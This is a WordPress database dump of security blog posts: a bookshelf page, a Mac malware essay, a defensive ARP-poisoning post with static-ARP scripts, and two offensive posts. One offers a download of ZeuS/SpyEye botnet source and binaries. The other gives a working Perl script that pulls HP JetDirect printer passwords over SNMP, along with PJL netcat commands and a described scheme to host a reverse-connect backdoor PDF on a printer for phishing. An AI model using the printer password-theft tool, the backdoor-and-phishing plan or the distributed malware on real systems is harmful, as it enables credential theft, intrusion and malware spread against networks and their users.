'230','1','open','http://www.attackvector.org/?page_id=230','0','open','','2','One thing most of us in the computer world like to do is read.  Especially reference books.  So, I\'m going to be putting together a list of books that I\'ve either read, or have been told to read, that focus on network security and hacking.\n\nIf you have any book suggestions, please let me know so I can add it to the list.  In the mean time, click the link below to browse my current list of books.  Please note, by purchasing a book through my bookshelf, you are directly supporting this site.  So, if you find my blog useful, buy a book!  :-)\n\n<center><h4><a href=\"http://astore.amazon.com/attavect-20\">Attack Vector Bookshelf</a></h4></center>','','2010-05-18 13:37:42','2010-05-18 18:37:42','','','2010-05-18 13:37:42','2010-05-18 18:37:42','attack-vector-store','0','','publish','AV Bookshelf','page',''),(
'639','12','open','http://www.attackvector.org/?p=639','0','open','','2','If you\'d like to take a look at the ZeuS/SpyEye botnet source code and see how it ticks, you can download it below.  I\'m not sure how long this will be up (for obvious reasons), so get it while it\'s hot.\n\n<a href=\"http://www.attackvector.org/files/ZeuS.tar.bz2\">ZeuS 2.0.8.9</a>\n\nEnjoy.. \n\nPS - I am in no way responsible for the use of this software.  I am distributing it purely for it\'s educational value.  It\'s a really good example of the science behind the bot networks and will, hopefully, help us combat them.\n\nPPS - I just noticed that it includes the binaries.. I would uh, recommend not running those unless you know what you\'re doing.  Like, say, in a virtual machine that you don\'t care about, for example.  If you find anything neat, let me know.  I\'m just starting to go through it myself.','','2011-05-12 14:53:47','2011-05-12 19:53:47','','','2011-05-12 14:53:47','2011-05-12 19:53:47','zeus-source-code-anyone','0','','draft','ZeuS source code, anyone?','post',''),(
'645','1','open','http://www.attackvector.org/?page_id=645','0','open','','2','Spend time around Mac users, and you will eventually hear one of them mention the immunity myth. If you\'re not familiar with it, allow me to explain; the myth states that Macs are, because of the way in which the OSX is built, immune to viruses. Not less susceptible, but actually immune. \n\nI think it\'s time we burst that particular theory bubble. \n\nI know as well as you do that anything is hackable, given the resources and enough time to do so. To suggest that a Mac is more secure is one thing - arguably, in a fresh state, OSX would beat Windows in terms of its base security level. But when you start to surf the web and allow the internet to connect to your Mac, the chances are that something will eventually slip onto the machine. \n\nAdmittedly, there are a lot of secure sites out there, and that reassuring \"HTTPS\" is getting more and more common. Sites for your bank (HSBC have authenticator hardware being sent out), for your mobile bill (<a href=\"http://www.o2.co.uk/broadband/\">www.o2.co.uk</a> is a good example) are all reliable and familiar, but unfamiliar sites should make Mac users just as wary as those on Windows, or Linux. \n\nSpeaking of Linux, a few people will argue that the reason Macs are immune is that hackers don\'t see them as worth their time, given the small install base when compared to that of Windows. But just because the install base is small doesn\'t mean that they\'re less likely to be hacked. A Windows machine will, on average, cost you less than an OSX device. For this reason, surely Mac users would have more in their accounts? If anything, Mac users are generally designers, creative types, who have the disposable income to afford a pricey computer, so for those aiming for bank details, it\'s statistically the more logical choice. \n\nOSX Lion adds FileVault 2, which is a more efficient version of its predecessor, allowing users to encrypt their files more rapidly and easily than before. But again, none of this is impervious - everything can be hacked, and although most people would assume that this defeatist outlook means antivirus software has no use and we should simply sit back and take the hits, it doesn\'t. Back up your files, encrypt them, sweep for malware, no matter what operating system you\'re on. Mac users are not immune, and those who think they are may one day get a rather unpleasant wake up call. \n','','2011-08-23 11:23:57','2011-08-23 16:23:57','','','2011-08-23 11:23:57','2011-08-23 16:23:57','the-mac-immunity-theory','0','','publish','The Mac Immunity Theory','page',''),(
'110','7','open','http://www.interwebz.us/wordpress/?p=110','0','open','','2','Ok, I\'ll admit, the last post didn\'t have a whole lot to do with printers, but it probably got you interested enough to read part 2.\n\nFirst, lets find our network printers..\n<blockquote>\n<pre>\n./jetpwn.pl eth0\nUsing range 10.0.0.1-255\n<!--more-->\nPassword for JetDirect running on 10.0.0.22\nHex password: 49 4e 54 45 52 57 45 42 5a\nASCII password: INTERWEBZ\n\nPassword for JetDirect running on 10.0.0.23\nHex password: 50 57 4e 5a\nASCII password: PWNZ\n</pre>\n</blockquote>\n\nNot only did that find the network printers, it also grabbed and converted the password for us.  ;-)\n\nIt\'s a little script that I wrote to make the process easier because, essentially, I\'m lazy.  Here\'s the code:\n<br>\n<pre lang=\"perl\" line=\"1\">\n$eth = $ARGV[0];\n\nif($eth eq \"\") {\n  print \"Usage: jetpwn.pl n\";\n  exit(0);\n}\n\nsub convert {\n  my $string = @_;\n  ($string = shift) =~ s/([a-fA-F0-9]{2})/chr(hex $1)/eg;\n  return $string;\n}\n\n@ifconf = `ifconfig $eth`;\n\nforeach $line (@ifconf) {\n  if($line =~ /inets+addr:(d+.d+.d+).*/) {\n    $range = $1;\n    print \"Using range $range.1-255n\";\n  }\n}\n\n# I rely on nmap to do my scanning, even within scripts, because IO::Socket\'s timeout of \'1\'\n# is too slow, and writing a script to do a half-open scan using perl\'s raw socket and pcap\n# libraries is somewhat overly complicated and not nearly as accurate as nmap.  Plus,\n# it\'s reinventing the wheel.  So, nmap it is!\n\nopen(NMAP, \"nmap -sS -p9100 $range.* --open|\") || die \"$!\";\nwhile() {\n  if(/^.*?((d+.d+.d+.d+))$/) {\n    push(@ips, $1);\n  }\n}\n\nforeach $ip (@ips) {\n  # I wont lie.. using snmpget instead of Perl\'s snmp lib is just pure laziness.  Heh heh\n  open(SNMP, \"snmpget -v 1 -c public $ip .1.3.6.1.4.1.11.2.3.9.1.1.13.0|\") || die \"$!\";\n  while() {\n    print \"Password for JetDirect running on $ipn\";\n    if(/^.*?Hex-STRING:s+(.*)/) {\n      $hexpass = $1;\n      print \"Hex password: $hexpassn\";\n      ($hexpass) =~ s/s+//eg;\n      $pass = &amp;convert($hexpass);\n      $pass =~ s/=108;//eg;\n\n      print \"ASCII password: $passnn\";\n    }\n  }\n}</pre>\n\nIt utilizes a \"vulnerability\" in the MIB\'s that the HP printers use.. so, using that OID (.1.3.6.1.4.1.11.2.3.9.1.1.13.0), the printer will display the password in hex.. so a simple conversion will give it to you in ASCII.  The passwords are case insensitive, even though they\'ll be displayed uppercase.\n\nHint.. add the passwords found to your wordlist.  Often the passwords are not unique to the printer.\n\nSo, now you have full control over the printer.. whether it has a password or not.  Now what?\n\n<blockquote>\n<pre>snmpwalk -c public -v1 10.0.0.22</pre>\n</blockquote>\n\nI\'m not going to paste the output, because there\'s a ton.. but go through the results and you\'ll find interesting information about the network, and who knows what else.\n\nAlso, open up a web browser and go to \"http://ip\" and you can play with all sorts of fun stuff there, depending on the printer version.  One suggestion.. via the web interface, you can enable and disable services.\n\nBeyond that, there\'s much fun to be had using PJL (Printer Job Language).  One of the most widely known PJL commands is:\n\n<blockquote>\n<pre>echo \"@PJL RDYMSG DISPLAY=\"Interwebz!!\"|nc  9100</pre>\n</blockquote>\n\nThat will change the default \"ready message\" that\'s displayed on the LCD screen of an HP printer.  It can be a fun prank if you\'re creative enough.. especially if you script it to change all the printers on the network ;-)\n\nFun, but doesn\'t accomplish much..\n\nI highly recommend reading this document, as it describes PJL really well.\n\n<a href=\"http://h20000.www2.hp.com/bc/docs/support/SupportManual/bpl13208/bpl13208.pdf\">http://h20000.www2.hp.com/bc/docs/support/SupportManual/bpl13208/bpl13208.pdf</a>\n\nWe\'re actually going to use a program called \"HiJetter\" to accomplish this.  Essentially, HiJetter is a front-end to commands like this:\n\n<blockquote>\n<pre>@PJL DEFAULT HOLD=STORE</pre>\n</blockquote>\n\n;-)\n\nAnyway, Download the windows binary from here <a href=\"http://www.phenoelit-us.org/fr/tools.html\">http://www.phenoelit-us.org/fr/tools.html</a>\n\nYes, download the Windows binary even if you\'re running linux.  Unzip it and run it with \'wine Hijetter.exe\'.  The *nix version does not compile.. at all.\n\nNOTE:  HiJetter is not perfect.  It crashes quite often, so patience is a virtue.  I might rewrite it.. we\'ll see.\n\nOnce Hijetter is running, you\'ll have total control over the printer.. even access to the stored print jobs.\n\nSo, lets say you turn on job holding and you tell it to store, whether that be via Telnet or HiJetter.  The documents are all stored in\n\n<blockquote>\n<pre>0:savedevicesavedjobsheldjobs</pre>\n</blockquote>\n\nYou will be able to download images of anything sent to the printer.  Checks, invoices, all sorts of confidential information.\n\nAlso, you can upload files to the printer do be hosted on its built in web server.  This feature is useful for a number of reasons.. but my primary use is..\n\nLets say that the LAN is heavily firewalled.  Lets also say that on these gateways, they\'re running scanning proxies to check for viruses and malware going in and out of the network via web/email/etc.  Lets also say that they\'re running Snort to check for more serious exploits.  Lets say, though, that they have a wireless network set up for guests to use when they come to the office.\n\nI take a little trip and find the wireless network.  Whether it\'s WEP, or WPA, I\'m getting in.  Once in, I don\'t want to stick around for very long, so I look for printers (ok, maybe they\'re not my first target, but if nothing else pans out in short order, I\'m hitting them..).  I craft a PDF that opens a reverse connect backdoor, which points to my IP back at home (this is a pen test, so I don\'t care if they know my IP).  I upload this to their printer(s) and head home.\n\nOnce home, I craft an email to the receptionist.  (hint: contact@ usually goes to the receptionist and their job involves opening emails from random people).  This email contains a link to our special PDF, which is hosted on one of their printers, which will prevent any code actually being scanned by their firewalls/IDS/etc.  When the end user is infected, it reverse connects to me via port 80, or 443, so it looks like innocent web traffic.\n\nI hope this post gives some idea as to the dangers of network printers.  They\'re a very weak network device that is easily, easily compromised in a number of ways.  I would suggest going through that document about PJL commands and check out some of the fun stuff that you can do with it.','','2010-05-01 13:18:04','2010-05-01 18:18:04','','','2010-05-01 13:18:04','2010-05-01 18:18:04','fun-with-printers-part-2','0','','publish','Fun with printers (part 2)','post',''),(
'140','0','open','http://www.interwebz.us/wordpress/?p=140','0','open','','2','As promised, I\'m finally getting around to writing about some of the ways to protect yourself from ARP poisoning and MitM attacks.\n\nFirst, I\'ll start by saying.. it\'s difficult because there are a number of different ways to execute a MitM attack and some of them aren\'t easy to block.  But, lets start with ARP poisoning.\n\nYou want to make sure that every host on the network knows exactly what the gateways mac address is and you want to make sure the gateway knows exactly which host has which mac address.  Additionally, you want to make sure each host knows the mac address of all the other hosts.\n<!--more-->\nWe do this by configuring static mac addresses, which all but eliminates ARP on the network.\n\nOn Linux, you would create your static mac entries in <code>/etc/ethers</code>.  The format of this file looks like this:\n\n<blockquote>\n<pre>\n# gateway.mynetwork.com - Cisco\n192.168.0.1           00:00:0C:11:22:33\n\n# workstation1.mynetwork.com - Dell\n192.168.0.100        00:11:43:11:22:33\n</pre>\n</blockquote>\n\nSo on and so forth.  To utilize this file, you simply type\n\n<blockquote>\n<pre>\n$ arp -f\n</pre>\n</blockquote>\n\nThis tells \'arp\' to load all of the mac addresses and associated IP addresses from /etc/ethers and add them to the arp table staticly.  This will prevent them from being over written in the event of a MitM attack.\n\nOn Windows, it\'s a bit different because they neglected to add a switch to their arp command to load the mac addresses from a file, like the way Linux does it.  So, you have to create a batch file that looks like this:\n\n<blockquote>\n<pre>\n@echo off\nREM gateway.mynetwork.com - Cisco\narp -s 192.168.0.1 00-00-0C-11-22-33\n\nREM workstation1.mynetwork.com - Dell\narp -s 192.168.0.100 00-11-43-11-22-33\n</pre>\n</blockquote>\n\nSo, obviously trying to maintain something like this by hand is going to be a royal pain.  Well, you\'re welcome in advance.  I\'ve written tools to create and maintain these lists with very little involvement on your part.  ;-)\n\nThe first one that I wrote is 100% Perl, which might be useful if, for some reason, you don\'t have access to nmap.\n<p>\n<pre>\n#!/usr/bin/perl\nuse Net::ARP;\nuse Net::Ping;\n\n$dev = $ARGV[0];\n\nif($dev eq \"\") { \n      print \"Usage: $0 eth<#>n\";\n      exit(0);\n}\n\n@if = `ifconfig $dev`;\nforeach $line (@if) {\n      if($line =~ /^.*?inets+addr:(d+.d+.d+)..*/) {\n            $range = $1;\n            last;\n      }\n}\n\nopen(F, \">>dev.txt\") || die \"$!\";\n\nfor($i = 0;$i < \"255\"; $i++) {\n      $ipr = \"$range.\".$i.\"\";\n      $ping = Net::Ping->new(\"icmp\");\n      if($ping->ping($ipr, \"1\") eq \"1\") {\n            $mac = Net::ARP::arp_lookup($dev, \"$ipr\");\n            if($mac =~ /unknown/) { next; }\n            print \"$ipr $macn\";\n            print F \"$iprt$macn\";\n      }\n      $ping->close();\n}\n</pre>\n<br>\nYou can take the output from this and dump it right into /etc/ethers without having to do anything else.  To use this on windows, however, there\'s some formatting that needs to be done.  The most simple way to accomplish the formatting is by doing this:\n\n<blockquote>\n<pre>\n$ cat dev.txt\n192.168.0.1 	00:00:0C:11:22:33\n192.168.0.100	00:11:43:11:22:33\n\n$ cat dev.txt|perl -le \'while(<STDIN>){s/:/-/g; print \"arp -s $_\";}\' >> sarp.bat\n\n$ cat sarp.bat\narp -s 192.168.0.1 	00-00-0C-11-22-33\narp -s 192.168.0.100	00-11-43-11-22-33\n</pre>\n</blockquote>\n\nNow you can use \"dev.txt\" as /etc/ethers, and transfer \'sarp.bat\' over to a share that all of the windows boxes can access and have them run that file as a start up script.\n\n<b>UPDATE</b>: If you want more information in your /etc/ethers file, you can use this script instead of the previous one.  It produces a lot more data and is quite a bit faster.\n<p>\n<pre>\n# Creates a static arp table from the output of:\n# nmap -oX output.xml -sP 192.168.0.* (or whatever range you exist on)\n# Should be put in /etc/ethers and implemented\n# using \'arp -f\', which automatically reads /etc/ethers by default.\n#\n# When running \'arp -f\', you\'ll encounter this error:\n# SIOCSARP: Invalid argument\n# arp: cannot set entry on line <whatever> of etherfile /etc/ethers !\n# This is because you can\'t add a static arp entry for your own IP/MAC.\n# You can either ignore this error, or remove this entry.  Makes no\n# difference.   \n\n$dev = $ARGV[0];\nif($dev eq \"\") {\n  print \"Usage: ethers.pl <dev>n\";\n  print \"IE: ethers.pl eth0n\";\n  exit(0);\n}\n\n@ifconf = `ifconfig $dev`;\n   \nforeach $line (@ifconf) {\n  if($line =~ /inets+addr:(d+.d+.d+).d+.*/) {\n    $range = $1;\n    print \"Using range: $range.*n\";\n  }\n}\n\nsystem(\"nmap -oX output.xml -sP $range.*\");\n\nprint \"Generating output for file...n\";\nsleep 1;\n\nopen(F, \"output.xml\") || die \"$!\";\nopen(E, \">>ethers\") || die \"$!\";\nwhile(<F>) {\n  if(/^<host>.*?state=\"down\".*/) { next; }\n  if(/^<host>.*?state=\"up\".*/) { \n    $host = 1;\n  }\n  if(/^.*?addr=\"(d+.d+.d+.d+)\".*/ && $host == \"1\") {\n    $ip = $1;\n  }\n  if(/^.*?addr=\"(.*?)\"s+.*?vendor=\"(.*?)\".*/ && $host == \"1\") {\n    $mac = $1;\n    $vendor = $2;\n  }\n  if(/^.*?hostnames+name=\"(.*?)\".*/ && $host == \"1\") {\n    $desc = $1;\n  }\n  if(/^</host>/ && $host == \"1\") {\n    $host = 0;\n    print \"# $desc - $vendorn\";\n    print \"$ipt$macnn\";\n    print E \"# $desc - $vendorn\";\n    print E \"$ipt$macnn\";\n  }\n}  \n   \nclose(F);\nclose(E);\n</pre>\n\nSo, this takes care of the workstations.. what about the gateway?\n\nThis is where things suck a bit.  Unless you\'re running Linux (or Cisco, or Juniper, or, or, or)...(or, I suppose, Windows, too) as a gateway, you\'re somewhat hindered.  If you\'re running Linux or Windows as a gateway, you can simply use the same method as used above to pull off static arp tables.\n\nIf you\'re running a DLink, Netgear, Linksys, etc.. you\'re kind of up a creek unless the firmware that you\'re running gives the option to do mac address filtering.  That said, I\'m not entirely sure that mac address filtering and static arp tables are one in the same.  Anyone know?\n\nIf, however, your gateway does support mac address filtering, I highly suggest enabling it.  *Especially* on wireless networks.\n\nThe other thing that this accomplishes, which is kind of nice when working on a larger network, is that it prevents someone from accidentally configuring their IP to the same as someone else\'s.\n\nThe next post will discuss the MitM attack method using ICMP redirects and prevention.','','2010-05-04 11:58:23','2010-05-04 16:58:23','','','2010-05-04 11:58:23','2010-05-04 16:58:23','arp-poisoning-and-man-in-the-middle-attacks-part-3','0','','publish','ARP Poisoning and Man in the Middle Attacks [part 3]','post','');
